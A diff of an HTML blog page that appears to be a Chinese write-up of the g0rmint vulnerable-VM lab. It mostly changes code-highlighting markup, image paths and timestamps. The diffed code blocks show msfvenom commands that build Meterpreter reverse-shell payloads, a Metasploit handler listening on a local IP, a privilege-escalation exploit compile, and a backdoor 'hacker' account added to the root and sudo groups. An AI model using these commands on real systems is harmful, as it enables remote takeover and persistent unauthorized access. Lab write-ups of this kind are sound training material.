@@ -116,10 +116,10 @@
 <meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/蚁剑1.png">
 <meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/蚁剑2.png">
 <meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/sysinfo.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/g0rmint%5C%E6%8F%90%E6%9D%83.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/g0rmint%5Cflag.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/提权.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/flag.png">
 <meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/更换内核.png">
-<meta property="og:updated_time" content="2019-08-10T09:48:54.329Z">
+<meta property="og:updated_time" content="2019-08-10T10:26:04.326Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="g0rmint渗透实战">
 <meta name="twitter:description" content="前言这里自动设置的是桥接，记得修改为NAT 靶机难度不大，但是十分狗血，莫名其妙的问题一大堆 渗透测试主机发现netdiscover:netdiscover -r 192.168.64.0/24   端口扫描  仅开放22与80端口，看样子需要从web层面进行渗透 Web信息收集（1）目录扫描 扫描器发现，网站根目录下存在robots.txt，打开提示/g0rmint/ 继续使用扫描器发现：log">
@@ -443,7 +443,7 @@
                 
               
 
-              <time title="创建时间：2019-08-10 17:26:14 / 修改时间：17:48:54" itemprop="dateCreated datePublished" datetime="2019-08-10T17:26:14+08:00">2019-08-10</time>
+              <time title="创建时间：2019-08-10 17:26:14 / 修改时间：18:26:04" itemprop="dateCreated datePublished" datetime="2019-08-10T17:26:14+08:00">2019-08-10</time>
             
 
             
@@ -610,30 +610,32 @@
 <ol>
 <li>二进制文件</li>
 </ol>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=&lt;Your<span class="built_in"> IP </span>Address&gt; <span class="attribute">LPORT</span>=&lt;Your<span class="built_in"> Port </span><span class="keyword">to</span> Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="builtin-name">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="builtin-name">set</span> lhost 192.168.64.131</span><br><span class="line"><span class="builtin-name">set</span> lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.64.131</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
 <ol start="2">
 <li>PHP文件</li>
 </ol>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp <span class="attribute">LHOST</span>=&lt;Your<span class="built_in"> IP </span>Address&gt; <span class="attribute">LPORT</span>=&lt;Your<span class="built_in"> Port </span><span class="keyword">to</span> Connect On&gt; -f<span class="built_in"> raw </span>&gt; shell.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="builtin-name">set</span> payload php/meterpreter_reverse_tcp</span><br><span class="line"><span class="builtin-name">set</span> lhost 192.168.64.131</span><br><span class="line"><span class="builtin-name">set</span> lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter_reverse_tcp</span><br><span class="line">set lhost 192.168.64.131</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
 <p>由于目标服务器没有gcc，于是在本地Linux系统中生成exp：</p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c <span class="built_in">exp</span>.c -o <span class="built_in">exp</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c exp.c -o exp</span><br></pre></td></tr></table></figure>
 
 <p>将exp上传至目标服务器中，在msf shell中执行，成功提权：</p>
-<p><img src="//songxpu.github.io/2019/08/10/g0rmint/g0rmint%5C%E6%8F%90%E6%9D%83.png" alt="1"></p>
+<img src="//songxpu.github.io/2019/08/10/g0rmint/提权.png" width>
+
 <p>在/root/目录下获取到flag</p>
-<p><img src="//songxpu.github.io/2019/08/10/g0rmint/g0rmint%5Cflag.png" alt="1"></p>
+<img src="//songxpu.github.io/2019/08/10/g0rmint/flag.png" width>
+
 <p>至此，渗透实验基本完成。</p>
 <p>我这里额外添加了一个普通用户，并将它加入到管理员和sudo组</p>
-<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">useradd</span> hacker</span><br><span class="line"><span class="symbol">passwd</span> hacker</span><br><span class="line"><span class="symbol">usermod</span> -s /<span class="keyword">bin/bash </span>hacker</span><br><span class="line"><span class="symbol">usermod</span> -g root hacker</span><br><span class="line"><span class="symbol">usermod</span> -aG sudo hacker</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">useradd hacker</span><br><span class="line">passwd hacker</span><br><span class="line">usermod -s /bin/bash hacker</span><br><span class="line">usermod -g root hacker</span><br><span class="line">usermod -aG sudo hacker</span><br></pre></td></tr></table></figure>
 
 <p>这里因为在msf shell中，不能顺利的修改文件，这里没有完全将普通用户提升为root权限。</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id hacker</span><br><span class="line"><span class="attribute">uid</span>=1001(hacker) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root),27(sudo)</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id hacker</span><br><span class="line">uid=1001(hacker) gid=0(root) groups=0(root),27(sudo)</span><br></pre></td></tr></table></figure>
 
 <h3 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h3><blockquote>
 <p>这个靶机因为提权exp的问题耗费了太多的时间精力，还专门去下了一个相同版本的Ubuntu来gcc编译，然后……生成的exp仍然不行</p>
